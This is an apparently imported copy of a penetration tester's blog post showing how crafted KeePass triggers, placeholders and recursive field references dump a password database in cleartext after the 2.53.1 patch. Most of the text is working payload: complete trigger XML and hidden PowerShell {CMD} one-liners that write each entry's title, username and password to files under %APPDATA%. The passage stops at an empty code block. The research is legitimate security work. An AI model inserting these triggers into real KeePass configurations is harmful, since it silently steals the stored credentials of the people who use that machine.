---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-07_keepass-triggers-are-dead-long-live-keepass-triggers.md
original_filename: 2023-06-07_keepass-triggers-are-dead-long-live-keepass-triggers.md
title: KeePass Triggers Are Dead, Long Live KeePass Triggers!
category: documents
detected_topics:
- jwt
- access-control
- command-injection
- otp
- automation-abuse
- api-security
tags:
- imported
- documents
- jwt
- access-control
- command-injection
- otp
- automation-abuse
- api-security
language: en
raw_sha256: a411dd1739ed34a786569133c64fbe5ecba52835fa0d6411cf28980603934a16
text_sha256: ce3b5d768e3b0c4d47024034684c27ed06d6c2d7330e66e703a576c555a51563
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: true
---

# KeePass Triggers Are Dead, Long Live KeePass Triggers!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-07_keepass-triggers-are-dead-long-live-keepass-triggers.md
- Source Type: markdown
- Detected Topics: jwt, access-control, command-injection, otp, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: True
- Raw SHA256: `a411dd1739ed34a786569133c64fbe5ecba52835fa0d6411cf28980603934a16`
- Text SHA256: `ce3b5d768e3b0c4d47024034684c27ed06d6c2d7330e66e703a576c555a51563`


## Content

---
title: "KeePass Triggers Are Dead, Long Live KeePass Triggers!"
page_title: "KeePass Triggers Are Dead, Long Live KeePass Triggers! | d3lb3_"
url: "https://d3lb3.github.io/keepass_triggers_arent_dead/"
final_url: "https://d3lb3.github.io/keepass_triggers_arent_dead/"
authors: ["Julien Bedel (@d3lb3_)"]
programs: ["KeePass"]
bugs: ["Local Privilege Escalation"]
publication_date: "2023-06-07"
added_date: "2023-06-12"
source: "pentester.land/writeups.json"
original_index: 1072
---

[](/assets/img/blog/keepass_triggers/meme_not_dead.png)

  

7 years ago, Will Schroeder (a.k.a @harmj0y) showed how attackers could abuse KeePass trigger system in order to extract cleartext passwords. As it only required the addition of some parameters in a configuration file, this technique was at the same time straightforward and quiet. I ended up abusing triggers whenever I encountered KeePass in penetration testing engagements, gathering every secret of the IT staff almost every time.

Because write access to such file typically requires administrator rights on the target machine, the technique was considered by KeePass developers (and probably the vast majority of the infosec community too) outside of the software threat model. However, a thread released on KeePass forum in early 2023 pointed at the issue and started to make big noise. CVE-2023-24055 was eventually filled at the same time, quickly drawing the public’s attention with numerous voices claiming that the password manager was not safe.

Following this controversy, KeePass developers eventually decided to introduce an additional check in version 2.53.1, which now systematically asks for the masterkey before exporting databases. While other post-exploitation techniques such as DLL injection still (and will always, as no patch is possible neither for KeePass nor any other password manager) allow attackers to extract secrets, I wanted to have a deeper look into the trigger system, see if I could find another way to get passwords from there.

This article demonstrates how a combination of KeePass triggers, placeholders and field references can be used to export databases by simply editing the configuration file.

## Reminders on the “old” trigger abuse __

Will Schroeder’s[article](https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/) already explains very well how KeePass triggers could be abused prior to version 2.53.1. Because his technique introduces various features that we are going to abuse later in this article, we will briefly explain it here.

As described in the documentation: _“KeePass features a powerful event-condition-action trigger system. With this system, workflows can be automated. For example, you could define a trigger that automatically uploads your database to a backup server after saving the file locally”_.

A typical trigger would for example be:

  * Event: when I save my database
  * Condition: if the BACKUP environment variable is set to TRUE
  * Action: backup the database in the cloud

For attackers, what is really important about triggers it that they are configured **outside** of the encrypted database, in the _KeePass.config.xml_ configuration file. Depending on how KeePass is tuned, it requires more or less rights for an attacker to access the file. Note that password managers are often targeted in a post-exploitation context, meaning that we will frequently have administrator rights on the target machine. More details on KeePass configuration file locations are listed in the [Configuration](https://keepass.info/help/base/configuration.html) doc page.

The list of available events, conditions and actions are listed in the [Trigger](https://keepass.info/help/v2/triggers.html) doc page. Several examples are shown in the [Trigger Examples](https://keepass.info/help/kb/trigger_examples.html) page too.

[](/assets/img/blog/keepass_triggers/actions_list.png) _Every action available at the moment, shown from the the graphical user interface._

As its name suggests, the _Export active database_ action will make KeePass export the current database to any reachable location. Several formats are available for the export, among which _KeePass CSV (1.x)_ and _KeePass XML (2.x)_ are not encrypted.

As an attacker, we can easily create a malicious trigger from the graphical interface, then grab the resulting XML in our own configuration file. Here is an example which exports every entry’s fields in a cleartext CSV, right after the database is unlocked:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  

| 
  
  
  <Trigger>
  <Guid>JuPkdhoKfEGAbGTr10Cmbw==</Guid>
  <Name>export</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
  <Event>
  <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
  <Parameters>
  <Parameter>0</Parameter>
  <Parameter />
  </Parameters>
  </Event>
  </Events>
  <Conditions />
  <Actions>
  <Action>
  <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
  <Parameters>
  <Parameter>%appdata%\export.csv</Parameter>
  <Parameter>KeePass CSV (1.x)</Parameter>
  <Parameter />
  <Parameter />
  </Parameters>
  </Action>
  </Actions>
  </Trigger>
  
  
---|---  
`

This XML is ready to be inserted in a target’s _KeePass.config.xml_ (`<Configuration><Application><TriggerSystem><Triggers>`). The trigger will then be loaded on the upcoming KeePass startup. Next time a database is unlocked, it will be exported to `%appdata%\export.csv`.

This whole process was done silently in the background, until patch 2.53.1 introduced a mandatory masterkey prompt to export databases. Here is what the new prompt looks like:

[](/assets/img/blog/keepass_triggers/export_prompt.png)

While the _“Export”_ indication is not _that_ obvious, asking a user for its masterkey twice in a row (one time to unlock the database + one time for the export) will probably raise suspicions.

> The corresponding CVE-2023-24055 is still marked as _DISPUTED_ by NIST. While it is not the subject of this article to determine whether trigger system abuse is a vulnerability or not, I highly recommend you to read the whole [forum thread](https://sourceforge.net/p/keepass/discussion/329220/thread/a146e5cf6b). It sums up pretty well each point of view, and even includes extra salt from the participants! In my opinion, the decision to add a patch is understandable, but also creates a risk for users to reconsider the initial threat model, stating that every action taken as administrator (injecting DLL, abusing the plugin system, replacing KeePass binary) would also need its own fix: it’s basically endless.

## Leaking passwords through the placeholder system __

### KeePass placeholders __

When reading through KeePass trigger documentation, I came across a sentence that caught my attention :_“Most strings in the trigger system are Spr-compiled, i.e. placeholders, environment variables, etc. can be used”_.

Lots of word that we don’t know here, so let’s visit KeePass [Placeholders](https://keepass.info/help/base/placeholders.html) documentation page and try to find out more : _“KeePass uses the abbreviation ‘Spr’ for ‘String placeholder replacement’. An Spr-compiled field is a field where placeholders are replaced when performing an action with this field.”_

In other words, placeholders are special strings enclosed with braces, that are compiled on-the-fly by KeePass. For example, if you want to dynamically use the current entry’s username, you can evaluate it with the `{USERNAME}` placeholder.

[](/assets/img/blog/keepass_triggers/placeholder_example.png) _The username and title parts of the URL are dynamically replaced using a placeholder._

The example above would obviously not be of much use in a real-life scenario, but you get the idea of this whole compilation behavior. From what I read online, placeholders are mostly used to perform entry auto-typing on browsers. They offer large scripting possibilities, as they support basically every field of an entry:

[](/assets/img/blog/keepass_triggers/placeholders_list.png)

I bet you saw that too, you can export the password field from a placeholder! Note that many other things are possible, including direct interaction with the operating system like reading environment variables, getting and setting the clipboard, or even execute command lines.

We can already build a basic trigger that makes use of placeholders to export database secrets. It could for example use the _Copied entry data to clipboard_ event, and trigger an _Execute command line / URL_ action that would write `{TITLE}:{USERNAME}:{PASSWORD}:{URL}` to a text file, successfully extracting every entry that the user copies to its clipboard.

The PowerShell would be as simple as simple as:

`
  
  
  1
  

| 
  
  
  Add-Content $env:APPDATA'\clipboard_export.txt' '{TITLE}:{USERNAME}:{PASSWORD}:{URL}'
  
  
---|---  
`

We insert this code inside a trigger, And the resulting trigger would look like this:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  

| 
  
  
  <Trigger>
  <Guid>LUhj5EaVp0iip+LdLbNYwQ==</Guid>
  <Name>Clipboard Export</Name>
  <Events>
  <Event>
  <TypeGuid>P35exipUTFiVRIX78m9W3A==</TypeGuid>
  <Parameters>
  <Parameter>0</Parameter>
  <Parameter />
  </Parameters>
  </Event>
  </Events>
  <Conditions />
  <Actions>
  <Action>
  <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
  <Parameters>
  <Parameter>PowerShell.exe</Parameter>
  <Parameter>-C "Add-Content $env:APPDATA'\clipboard_export.txt' '{TITLE}:{USERNAME}:{PASSWORD}:{URL}';"</Parameter>
  <Parameter>False</Parameter>
  <Parameter>1</Parameter>
  <Parameter />
  </Parameters>
  </Action>
  </Actions>
  </Trigger>
  
  
---|---  
`

We can check that everything is working as expected by copying an entry in our clipboard, then have a look at `%appdata%\clipboard_export.txt`.

[](/assets/img/blog/keepass_triggers/username_copy.png) _An entry’s username being copied to the clipboard._

[](/assets/img/blog/keepass_triggers/clipboard_export.png) _The malicious trigger successfully wrote the copied entry (and its password!) to a file._

We are able to leak some passwords, this is cool but still very limited because:

  1. It relies on user interaction.
  2. It is not exhaustive, and would be much nicer if we could get every database entry.

> Understanding how simple triggers works is a good checkpoint before heading to more ~~brainfucking~~ complex ones. As you progress through the blog post, feel free to try each of them in your KeePass!!

### KeePass field references __

From an attacker perspective, the main issue with placeholders is that they are linked to the currently selected entry, limiting exploitations to where the user points its mouse on the graphical interface. Let’s RTFM more, see if we could find another way to leverage placeholders.

After a bunch of reading, I found exactly what was needed: _“Fields of other entries can be inserted using Field References”_. This feature is meant for cases when “ _multiple entries can share a common field, and by changing the actual data entry all other entries will also use the new value”_.

As KeePass developpers did a really nice work with their [documentation page](https://keepass.info/help/base/fieldrefs.html), I will just show it as it is:

[](/assets/img/blog/keepass_triggers/field_references_doc.png)

Field references are probably the most crucial element that we are going to use, so let’s take the time to understand it well with the following example:

[](/assets/img/blog/keepass_triggers/field_references_example.png)

By specifying “U” as _< WantedField>_, “T” as _< Searchin>_ and “SRV01” as _< Text>_, we define a field reference that retrieves the username of an entry whose title’s contains “SRV01”. As the first entry matches, we notice that the placeholder is eventually replaced by _admin_ (violet arrow).

If we are able to infer or guess the value of an entry’s title, we can export each of its fields. Let’s say that we target the virtualization environment of a company, it is actually quite possible that the IT staff’s database has entries whose title contains keywords like _vmware_ , _vsphere_ , _vcenter_ , _esx_ , etc.

It is important to keep in mind that there is no need for our keywords to perfectly match the entries’ title, as KeePass [simple search mode](https://keepass.info/help/base/search.html#mode_se) is used to resolve them. If the title is _vSphere Administrator Access_ , then `{REF:<WantedField>@T:vsphere}` is enough to get a match.

Following this principle, we can create a similar PowerShell-executing trigger that tries to resolve the following references and write them in a file, hopefully gathering passwords on the way:

`
  
  
  1
  2
  3
  4
  

| 
  
  
  {REF:U@T:vmware}:{REF:P@T:vmware}:{REF:A@T:vmware}
  {REF:U@T:vsphere}:{REF:P@T:vsphere}:{REF:A@T:vsphere}
  {REF:U@T:vcenter}:{REF:P@T:vcenter}:{REF:A@T:vcenter}
  {REF:U@T:esxi}:{REF:P@T:esx}:{REF:A@T:esxi}
  
  
---|---  
`

The resulting trigger would be:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  

| 
  
  
  <Trigger>
  <Guid>cwlVj6cXjUaDVnvryDJkFw==</Guid>
  <Name>Reference Export</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
  <Event>
  <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
  <Parameters>
  <Parameter>0</Parameter>
  <Parameter />
  </Parameters>
  </Event>
  </Events>
  <Conditions />
  <Actions>
  <Action>
  <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
  <Parameters>
  <Parameter>PowerShell.exe</Parameter>
  <Parameter>-C "Add-Content $env:APPDATA'\reference_export.txt' \"{REF:T@T:vmware}:{REF:U@T:vmware}:{REF:P@T:vmware}`n{REF:T@T:vsphere}:{REF:U@T:vsphere}:{REF:P@T:vsphere}`n{REF:T@T:vcenter}:{REF:U@T:vcenter}:{REF:P@T:vcenter}`n{REF:T@T:esxi}:{REF:U@T:esxi}:{REF:P@T:esxi}\";"</Parameter>
  <Parameter>False</Parameter>
  <Parameter>1</Parameter>
  <Parameter />
  </Parameters>
  </Action>
  </Actions>
  </Trigger>
  
  
---|---  
`

Because our sample database had an entry’s title matching “vcenter”, the third line of our export file will successfully includes the entry and its password.

[](/assets/img/blog/keepass_triggers/sample_database.png) _The targeted sample database._

[](/assets/img/blog/keepass_triggers/reference_export.png) _Targeted entry leaked through the placeholder reference system._

> As demonstrated in the last screenshot, when the _< Searchin>_ string does not match any entry, the placeholder is not replaced (but no error is raised).
> 
> When multiple entries are matched, the placeholder is only replaced by the first match. As a result, potentially interesting entries may be “hidden” by this behavior.

This technique can already leak parts of the database from the configuration file, but is a bit hazardous: we overcome the need for user interaction, but still lack the exaustivity. Let’s get back to the documentation, see if we could find a way to uniquely predict every entry of the database.

## UUID recursion time!__

### Matching every entry of the database __

Apart from obvious fields like title, username, password and URL, there is a “hidden” one which is particularly important. The UUID field, as its name suggests, is a randomly-generated 128 bits identifier which makes each entry unique and referable. In a readable format, a UUID is equivalent to a 32 characters sequence, each picked randomly from A to F and 0 to 9. For example:_46C9B1FFBD4ABC4BBB260C6190BAD20C_.

The minimum requirement for a _< Searchin>_ string to get a match is a single character correlation. While a UUID is by design impossible to predict, guessing one of its characters is not so hard. Let’s take the character “0” as an example. Among every entry of the database, there is a high chance that we find one UUID containing the character. In other words, `{REF:I@I:0}` will _probably_ resolve a field.

> Computing the actual probability is fairly easy using the complementary. To get its value, we first compute the probability of **not finding** the character “0” (or any other character, as the result is them same) in any of the 32 positions, then subtract it from 1.
> 
> Since there are 15 other hexadecimal characters (1-9, A-F) besides “0” in the set of possibilities, the probability of not finding “0” in a single position is ${15 \over 16}$.
> 
> Applied to the 32 characters, not finding “0” in the whole UUID is therefore equivalent to $({15 \over 16})^{32}$.
> 
> As a result, the probability of finding a specific character at least once in any of the 32 positions is:
> 
> \\[1-({15 \over 16})^{32} ≈ 87\%\\]

If we successively match “0” or “1” or “2”, the probability increases to 99.89%. It means that a combination of `{REF:I@I:0} {REF:I@I:1} {REF:I@I:2}` will _almost always_ match the whole database. However, as explained in the last part, only the first matching entry is kept and replaced in the placeholder.

### Recursive field references __

Let’s try to get around the “first matching entry only” issue.

According to KeePass documentation, we can use the minus sign to exclude results from a search result:

[](/assets/img/blog/keepass_triggers/simple_search_doc.png)

By using the minus sign to build a recursive placeholder `{REF:I@I:0 -{REF:I@I:0}}`, we are able to exclude the first match and successfully access the second matching entry.

Let’s take a second to understand this, and assume that matching entry #1 has UUID _46C9B1FF.._ and matching entry #2 has UUID _DCC8CF1F.._ :

`
  
  
  1
  2
  3
  4
  5
  

| 
  
  
  # resolving the UUID of entry #1
  {REF:I@I:0} = 46C9B1FF..
  
  # resolving the UUID of entry #2
  {REF:I@I:0 -{REF:I@I:0}} = {REF:I@I:0 -46C9B1FF..} = DCC8CF1F1..
  
  
---|---  
`

This works only because :

  1. The resolution order is consistent between searches (`{REF:I@I:0}` will always match the same entry).
  2. A recursive placeholder always compiles “deeper” elements first.

We can build a trigger that would Spr-compile and write the following placeholders in a file:

`
  
  
  1
  2
  3
  

| 
  
  
  {REF:U@I:0}  {REF:P@I:0}  {REF:A@I:0}
  {REF:U@I:0 -{REF:I@I 0}}  {REF:P@I:0 -{REF:I@I 0}}  {REF:A@I:0 -{REF:I@I:0}}
  ...  ...  ...
  
  
---|---  
`

The next step would be to add another level of recursion with `{REF:U@I:0 -{REF:U@I:0 -{REF:I@I:0}}}` etc. I created a [dirty Python script](https://gist.github.com/d3lb3/fb6f5d82e47744f56117b350d94a6029) to generate recursive payloads.

To increase the probability of matching the whole database, we can add a second character match like so:

`
  
  
  1
  2
  3
  4
  5
  

| 
  
  
  {REF:U@I:0}  {REF:P@I:0}  {REF:A@I:0}
  {REF:U@I:1}  {REF:P@I:1}  {REF:A@I:1}
  {REF:U@I:0 -{REF:I@I:0}}  {REF:P@I:0 -{REF:I@I:0}}  {REF:A@I:0 -{REF:I@I:0}}
  {REF:U@I:1 -{REF:I@I:1}}  {REF:P@I:1 -{REF:I@I:1}}  {REF:A@I:1 -{REF:I@I:1}}
  ...  ...  ...
  
  
---|---  
`

Let’s test the resulting trigger against our sample database:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  

| 
  
  
  <Trigger>
  <Guid>cwlVj6cXjUaDVnvryDJkFw==</Guid>
  <Name>Recursive Export</Name>
  <TurnOffAfterAction>true</TurnOffAfterAction>
  <Events>
  <Event>
  <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
  <Parameters>
  <Parameter>0</Parameter>
  <Parameter />
  </Parameters>
  </Event>
  </Events>
  <Conditions />
  <Actions>
  <Action>
  <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
  <Parameters>
  <Parameter>PowerShell.exe</Parameter>
  <Parameter>-C "Add-Content $env:APPDATA'\recursive_export.txt' \"{REF:I@I:0}:{REF:T@I:0}:{REF:U@I:0}:{REF:P@I:0}`n{REF:I@I:0 -{REF:I@I:0}}:{REF:T@I:0 -{REF:I@I:0}}:{REF:U@I:0 -{REF:I@I:0}}:{REF:P@I:0 -{REF:I@I:0}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}\";"</Parameter>
  <Parameter>False</Parameter>
  <Parameter>1</Parameter>
  <Parameter />
  </Parameters>
  </Action>
  </Actions>
  </Trigger>
  
  
---|---  
`

[](/assets/img/blog/keepass_triggers/recursive_export.png) _Every entry is successively matched and extracted with recursive field references._

Great! We are now able to recursively extract every entry of a database, unless.. KeePass had a placeholder resolution depth limit made to avoid infinite loops (that would for example occur if we set an entry’s username to `{USERNAME}`).

[](/assets/img/blog/keepass_triggers/recursion_limit.png) _`KeePass/Util/Spr/SprEngine` source code includes a maximum depth of recursion._

As a result, we cannot go further than 12 levels of recursion, meaning that we cannot extract more than 12 entries.

## Using KeePass as a programming language?__

We cannot use nested field references, but can imagine a command-executing trigger that would successively resolve UUIDs using only one placeholder like:

`
  
  
  1
  2
  3
  4
  5
  

| 
  
  
  $excluded_uuids = ''
  while(...) {
  $new_uid = '{REF:I@I:0 $excluded_uuids}'
  $excluded_uuids += ' -'$new_uid
  }
  
  
---|---  
`

If you run this simple code on paper, you can imagine that:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  

| 
  
  
  # First loop
  $excluded_uuids == ''
  $new_uid == {REF:I@I:0} == 46C9B1FF..
  
  # Second loop
  $excluded_uuids == '-46C9B1FF..'
  $new_uid == {REF:I@I:0 -46C9B1FF..} == DCC8CF1F1..
  
  # Third loop..
  
  
---|---  
`

There is however a massive concern about this solution. As explained in the documentation: _“The file/URL and arguments are parsed by the Spr engine**before** they are sent to the shell”_. Because placeholders are always resolved first in the process, we cannot include PowerShell variables inside `{REF:I@I:0 $exluded_uids}`. In fact, placeholders can be considered as constant values when used in command line arguments, preventing their use in loops or conditional flows.

### “Variables” __

The only element which can be resolved before a placeholder is actually another placeholder inside it. Luckily for us,`{CMD}` is precisely made to execute commands, which let us replace `{REF:I@I:0 $exluded_uids}` by `{REF:I@I:0 {CMD ...}}`.

To execute a command in a hidden window, `CMD` uses the following syntax:

`
  
  
  1
  

| 
  
  
  {CMD:/PowerShell.exe -C "\<commands\>"/M=C,W:0,O:1,WS=H/}
  
  
---|---  
`

> While understanding {CMD} placeholder in details is not essential for the rest of the blog post, I highly recommend you to read the related [documentation page](https://keepass.info/help/base/placeholders.html) (at the very bottom) if you don’t want to blindly copy-paste payloads from this article and/or create your own.

Instead of storing UUIDs in variables, we can put them in a text file (or virtually any place reachable from the command such as environment variables or the clipboard) that will be written and read before the compilation of placeholders. The `{CMD ...}` part of the placeholder would then:

  1. Retrieve the previously found UUIDs from the text file
  2. Build the UUIDs exclusion string
  3. Insert the string in a field reference placeholder `{REF:I@I:0 <list of UUIDsto exclude>}`
  4. Append the newly-discovered UUID to the text file
  5. Repeat from step 1 until there are no more UUID left to discover

### “Loops” __

Because placeholders are constant in the context of PowerShell, we cannot simply do a loop like this and expect the placeholder value to be different each iteration:

`
  
  
  1
  2
  3
  4
  5
  

| 
  
  
  $excluded_uuids = ''
  while(...) {
  $new_uid = '{REF:I@I:0 {CMD ...}}'
  $excluded_uuids += ' -'$new_uid
  }
  
  
---|---  
`

Since our placeholder is part of a trigger, we can however use it inside KeePass’s _“every X second”_ event and successively resolve the placeholder’s value on each loop.

[](/assets/img/blog/keepass_triggers/event_every_second.png) _“Time - Period” trigger event can be used to resolve the same placeholder multiple times_

To stop the loop, we can simply make a `{CMD}` placeholder return a string like _“stop”_ to tell KeePass we are done.

[](/assets/img/blog/keepass_triggers/end_loop_example.png) _The trigger will be executed when the command return false_

Once the stop condition is valid, the trigger is executed. Because actions where already performed in the condition through `{CMD}`, we no longer need any, and can immediately stop the trigger. For a trigger to be disabled right after it is executed, we can simply check _“Turn off after executing actions (run once)”_ box in the trigger properties, or use the _“Change trigger on/off state”_ action.

## Putting it all together __

These KeePass “variable” and “loop” concepts may seem somewhat obscure. But now that theory is discussed, we can finally jump to the practical part where all the magic happens!

Let’s build a trigger that consecutively write each line of `extact.csv` with the following info:

`
  
  
  1
  

| 
  
  
  UUID,TITLE,USERNAME,PASSWORD,URL
  
  
---|---  
`

The payload will be divided in two parts: one to successively resolve UUIDs through field reference exclusion search, and one to resolve each UUID’s corresponding fields.

### Building the UUID list __

Remember, we are using the exclusion search method so we need to build a placeholder able to consecutively resolve each new UUID from the list of previous ones, then append it to a file. The first element of this placeholder will simply read UUIDs from`extract.csv` and build the reference exclusion string.

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  

| 
  
  
  $excluded_uuids='';
  if (!(Test-Path $env:APPDATA'\extract.csv'))
  {
  New-Item -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;
  }
  foreach($line in Get-Content $env:APPDATA'\extract.csv')
  {
  $excluded_uuids+=' -'+$line.Split(',')[0];
  }
  Write-Output $excluded_uuids;
  
  
---|---  
`

We put the snippet in a placeholder (with aliases and variable renames to make the payload a bit shorter):

`
  
  
  1
  

| 
  
  
  {CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}
  
  
---|---  
`

When successive lines will later be appended to `extract.csv`, this placeholder should successively output:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  

| 
  
  
  # first execution
  -***REDACTED-SUSPECT-TOKEN***  # second execution
  -48615B89725E4F4987C20B9F2CCF90EC -***REDACTED-SUSPECT-TOKEN***  # third execution
  -48615B89725E4F4987C20B9F2CCF90EC -9A870B21F03856429CBCE5AEFAA42FB7 -***REDACTED-SUSPECT-TOKEN***  # fourth loop..
  
  
---|---  
`

Once the exclusion string is built, we use it inside a field reference to resolve the next UUID before appending it to `extact.csv`:

`
  
  
  1
  2
  3
  4
  

| 
  
  
  $new_uid='{REF:I@I:0{CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}}';
  if(!($uid.StartsWith('{REF'))){
  Add-Content -Path $env:APPDATA'\extract.csv' -Value $new_uid -NoNewline;
  }
  
  
---|---  
`

`$new_uid` value will be:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  

| 
  
  
  # first execution
  {REF:I@I:0 -48615B89725E4F4987C20B9F2CCF90EC} == ***REDACTED-SUSPECT-TOKEN***  # second execution
  {REF:I@I:0 -48615B89725E4F4987C20B9F2CCF90EC -9A870B21F03856429CBCE5AEFAA42FB7} == ***REDACTED-SUSPECT-TOKEN***  # third execution..
  
  
---|---  
`

This code is meant to be executed inside a trigger condition, so it must be inserted in a placeholder first:

`
  
  
  1
  

| 
  
  
  {CMD:&PowerShell.exe -C "$uid='{REF:I@I:0{CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}}';echo $uid;if(!($uid.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $uid -NoNewline;}"&M=C,W:0,O:1,WS=H&}
  
  
---|---  
`

> Because we insert a {CMD} placeholder inside a {CMD}, a custom separator (here ‘&’) must be defined.

### Resolving every entry __

Each time a new UUID is resolved, we use it to determine every entry of the corresponding field.

Because we cannot store the UUID in a variable, we need to get the UUID from the file each time using `@(Get-Content -Path $env:APPDATA'\extract.csv')[-1]`. We insert this command in a `{CMD}` placeholder, itself in a `{REF}`. We have exact match on UUIDs now, so there is no need to use the exclusion search:

`
  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  

| 
  
  
  # resolve entries
  $title='{REF:T@I:{CMD:/PowerShell.exe -C "echo (Get-Content -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';
  $user='{REF:U@I:{CMD:/PowerShell.exe -C "echo (Get-Content -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';
  $password=***REDACTED*** -C "echo (Get-Content -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';
  $url='{REF:A@I:{CMD:/PowerShell.exe -C "echo (Get-Content -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';
  $output=','+$title+','+$user+','+$password+','+$url;
  
  # write to file or tell KeePass to stop the loop
  if(!($title.StartsWith('{REF'))){
  Add-Content -Path $env:APPDATA'\extract.csv' -Value $output;
  } else {
  echo 'stop';
  }
  
  
---|---  
`

Same as before, we insert everything in a `{CMD}` placeholder for it to be executed inside a trigger condition:

`
  
  
  1
  

| 
  
  
